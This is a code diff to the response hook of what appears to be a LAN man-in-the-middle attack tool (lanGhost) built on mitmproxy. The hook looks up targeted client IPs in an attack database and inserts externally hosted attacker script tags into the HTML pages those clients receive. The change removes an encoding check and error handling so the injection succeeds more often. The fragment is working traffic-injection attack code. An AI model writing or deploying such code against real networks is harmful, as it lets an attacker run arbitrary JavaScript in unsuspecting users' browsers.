@@ -51,12 +51,9 @@ def response(flow):
     DBcursor.execute("SELECT attackid FROM lanGhost_attacks WHERE target=? AND attack_type='injectjs' ORDER BY id DESC LIMIT 1", [str(flow.client_conn.address()[0])])
     data = DBcursor.fetchone()
     if not data == None:
-        if "content-type" in flow.response.headers and "content-encoding" in flow.response.headers:
+        if "content-type" in flow.response.headers:
             if flow.response.headers["content-type"][:9] == 'text/html':
-                try:
-                    html = BeautifulSoup(flow.response.content.decode("UTF-8"), "lxml")
-                except:
-                    return
+                html = BeautifulSoup(flow.response.get_text(), "lxml")
                 if html.body:
                     DBcursor.execute("SELECT jsurl FROM lanGhost_js WHERE target = ?", [str(flow.client_conn.address()[0])])
                     data = DBcursor.fetchall()
@@ -68,4 +65,4 @@ def response(flow):
                                 "script",
                                 src=jsurl)
                         html.body.insert(0, script)
-                    flow.response.content = html.encode("UTF-8")
+                    flow.response.text = str(html)
